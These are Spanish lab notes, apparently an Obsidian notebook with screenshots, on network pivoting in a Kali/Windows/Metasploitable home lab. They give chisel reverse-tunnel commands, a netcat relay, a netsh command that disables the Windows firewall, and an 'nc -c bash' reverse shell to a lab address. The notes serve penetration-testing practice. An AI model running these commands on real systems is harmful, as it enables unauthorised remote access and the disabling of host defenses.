# Preparación del entorno
![[Pasted image 20240708112454.png]]

# Maquina Kali Linux
![[Pasted image 20240708111838.png]]

# Maquina Windows
![[Pasted image 20240708112346.png]]

# Maquina Metasploitable
![[Pasted image 20240708112326.png]]


Una vez tenenos las 3 maquinas podemos ver que desde Windows podemos ver la maquina victima accediendo a unos de sus servicios
![[Pasted image 20240708142251.png]]

Ahora con chisel podemos hacer que nuestra maquina atacante vea el servicio, para ello levantamos un servidor de chisel desde nuestra maquina atacante
```
chisel server --reverse -p 4444
```
![[Pasted image 20240708142502.png]]

Ahora con la maquina de Windows creamos el tunel
```
chisel.exe client 192.168.0.14:4444 R:80:10.10.10.4:80
```
![[Pasted image 20240708142527.png]]

Y ahora desde el puerto 80 de nuestra maquina local podremos ver el puerto 80 de la maquina victima
![[Pasted image 20240708142638.png]]

Ahora generaremos una reverse shell, para ello primero desde la maquina intermediaria creamos el tunel
```
nc.exe -l -p 4444 -e "nc 192.168.0.14 1234"
```
![[Pasted image 20240708142754.png]]

Nos ponemos en escucha desde nuestra maquina por el puerto que hemos indicado
![[Pasted image 20240708142839.png]]

En la maquina WIndows utilizaremos netcat para hacer pivoting, para no tener problemas deshabilitaremos el firewall
```
netsh advfirewall set allprofiles state off
```

Y ahora creamos el tunel para poder  generarnos la reverse shell y la mandamos por el tunel
```
nc -c bash 10.10.10.3 4444
```
![[Pasted image 20240708142920.png]]

Y ya tendriamos la conexion creada
![[Pasted image 20240708143000.png]]